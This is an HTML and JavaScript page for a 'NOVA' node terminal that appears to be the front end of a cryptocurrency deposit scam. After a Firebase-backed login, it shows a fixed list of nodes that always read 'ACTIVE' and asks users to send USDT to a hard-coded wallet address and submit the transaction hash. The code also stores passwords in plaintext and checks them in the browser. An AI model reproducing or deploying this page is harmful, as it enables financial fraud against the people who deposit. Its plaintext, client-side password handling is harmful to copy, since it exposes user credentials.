<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA | Public Node Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0A192F; --accent: #64FFDA; --card-bg: #112240; --text-main: #CCD6F6; --text-dim: #8892B0; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--primary); color: var(--text-main); }
        .ticker { background: #020c1b; color: var(--accent); padding: 8px; font-size: 11px; border-bottom: 1px solid #112240; }
        
        /* Auth Styles */
        #auth-page { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #020c1b; }
        .auth-card { background: var(--card-bg); padding: 40px; border-radius: 12px; width: 100%; max-width: 380px; border-top: 4px solid var(--accent); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        /* Dashboard Styles */
        #dashboard { display: none; padding: 40px; max-width: 1000px; margin: auto; }
        .node-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; margin: 20px 0; }
        .node-item { background: #112240; padding: 10px; border-radius: 6px; font-size: 11px; display: flex; justify-content: space-between; border: 1px solid #233554; }
        
        input { width: 100%; padding: 12px; background: #0A192F; border: 1px solid #233554; color: white; border-radius: 4px; margin-bottom: 15px; box-sizing: border-box; }
        .btn-prime { width: 100%; padding: 14px; background: var(--accent); color: var(--primary); border: none; border-radius: 4px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .toggle-link { color: var(--accent); font-size: 12px; cursor: pointer; text-decoration: underline; margin-top: 15px; display: block; text-align: center; }
        
        .status-on { color: var(--accent); font-weight: bold; }
        footer { text-align: center; padding: 20px; color: var(--text-dim); font-size: 11px; }
    </style>
</head>
<body>

    <div class="ticker">
        <marquee>GLOBAL NETWORK: ACTIVE | PUBLIC REGISTRATION: OPEN | SECURE ASSET TERMINAL 2026</marquee>
    </div>

    <div id="auth-page">
        <div class="auth-card">
            <h2 id="auth-title" style="text-align: center; letter-spacing: 2px;">LOGIN</h2>
            <input type="text" id="username" placeholder="Choose Username">
            <input type="password" id="password" placeholder="Choose Password">
            <button class="btn-prime" id="auth-btn" onclick="handleAuth()">Access Terminal</button>
            <span class="toggle-link" id="toggle-text" onclick="toggleMode()">Don't have an account? Sign Up</span>
        </div>
        <footer>&copy; NOVA GLOBAL INFRASTRUCTURE</footer>
    </div>

    <div id="dashboard">
        <h1 style="color: var(--accent);">WELCOME TO NOVA</h1>
        <p id="welcome-msg" style="color: var(--text-dim);"></p>
        
        <div class="node-grid" id="nodeContainer"></div>

        <div style="background: #112240; padding: 30px; border-radius: 12px; border: 1px solid var(--accent); margin-top: 30px;">
            <h3>Institutional Funding Gateway</h3>
            <p style="font-size: 13px;">Deposit USDT to activate your assigned global node.</p>
            <div onclick="copyWallet()" style="background: #020c1b; padding: 15px; border-radius: 5px; font-family: monospace; color: var(--accent); cursor: pointer; border: 1px dashed #444; margin-bottom: 20px;">
                0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2
            </div>
            <input type="text" id="txid" placeholder="Enter Transaction Hash (TXID)">
            <button class="btn-prime" onclick="submitDeposit()">Confirm Deposit</button>
        </div>
        
        <p onclick="logout()" style="text-align:center; color:gray; cursor:pointer; margin-top:20px;">Logout</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo",
            authDomain: "home-94d45.firebaseapp.com",
            projectId: "home-94d45",
            appId: "1:964390949419:web:589840cb91b7e42ecd506e"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let isLoginMode = true;

        window.toggleMode = function() {
            isLoginMode = !isLoginMode;
            document.getElementById('auth-title').innerText = isLoginMode ? "LOGIN" : "SIGN UP";
            document.getElementById('auth-btn').innerText = isLoginMode ? "Access Terminal" : "Create Account";
            document.getElementById('toggle-text').innerText = isLoginMode ? "Don't have an account? Sign Up" : "Already have an account? Login";
        };

        window.handleAuth = async function() {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;

            if(!u || !p) return alert("Please fill all fields, sweetie.");

            if(isLoginMode) {
                const userRef = doc(db, "users", u);
                const userSnap = await getDoc(userRef);
                if(userSnap.exists() && userSnap.data().password === p) {
                    sessionStorage.setItem("user", u);
                    showDashboard();
                } else { alert("Invalid credentials, sweetie."); }
            } else {
                await setDoc(doc(db, "users", u), { password: p, joined: new Date().toISOString() });
                alert("Account created successfully! Now you can login.");
                toggleMode();
            }
        };

        window.submitDeposit = async function() {
            const tx = document.getElementById('txid').value;
            const user = sessionStorage.getItem("user");
            if(tx.length < 10) return alert("Invalid TXID");
            
            await setDoc(doc(db, "deposits", "tx_" + Date.now()), { user: user, txid: tx, status: "Pending" });
            alert("Deposit submitted! Our nodes are verifying your transaction, sweetie.");
        };

        function showDashboard() {
            document.getElementById('auth-page').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            document.getElementById('welcome-msg').innerText = "Logged in as: " + sessionStorage.getItem("user");
            loadNodes();
        }

        function loadNodes() {
            const container = document.getElementById('nodeContainer');
            const nodes = ["NV-Alpha", "NV-Beta", "NV-Gamma", "NV-Delta", "NV-Epsilon", "V-Layer-1", "V-Layer-2"];
            container.innerHTML = "";
            nodes.forEach(n => {
                container.innerHTML += `<div class="node-item"><span>${n}</span><span class="status-on">ACTIVE</span></div>`;
            });
        }

        window.copyWallet = () => { navigator.clipboard.writeText("0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2"); alert("Address Copied!"); };
        window.logout = () => { sessionStorage.clear(); location.reload(); };

        if(sessionStorage.getItem("user")) showDashboard();
    </script>
</body>
</html>
